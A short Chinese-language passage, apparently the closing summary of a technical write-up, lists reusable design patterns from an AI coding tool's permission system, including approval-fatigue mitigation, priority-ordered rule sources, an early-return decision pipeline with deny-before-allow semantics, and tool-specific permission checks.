- **审批疲劳缓解模式**：首次询问 + always allow 选项 + 可编辑 prefix。三件套合力，让用户的注意力只花在"新操作"上，而不是反复为相同操作点头。
- **双层决策架构**：静态纯函数（hasPermissionsToUseTool）+ 动态 React hook（useCanUseTool）。关注点分离、测试友好、跨场景复用。任何"决策逻辑需要被 UI 和非 UI 场景共用"的系统都适用。
- **Hook 扩展点模式**：通过 `PermissionRequest` hook 给企业部署留出扩展空间，统一管理权限决策。把"内置规则"和"企业规则"解耦，是企业级系统的常见范式。
- **Source 优先级模式**：多来源规则（user/project/local/cli/session）按优先级合并，高优先级 source 覆盖低优先级。优先级顺序反映"越靠近运行时越优先"的意图，可迁移到任何多源配置合并场景。
- **早返回管线模式**：决策管线七步任一步命中即返回，物理顺序即优先级。比"全部走完取最高优先级"更易测试、更易插拔，且天然保证 deny 优先于 allow 的安全语义。
- **工具自治权限模式**：通用规则引擎 + `tool.checkPermissions()` 下放工具特定判断。开闭原则在权限系统的兑现——新增工具不改管线。

这些模式组合起来，就是"一个既能自动放行大多数操作、又能在关键节点拦住风险、还能在无 UI 时安全降级"的权限体系骨架——可复用的是骨架，不是具体代码。


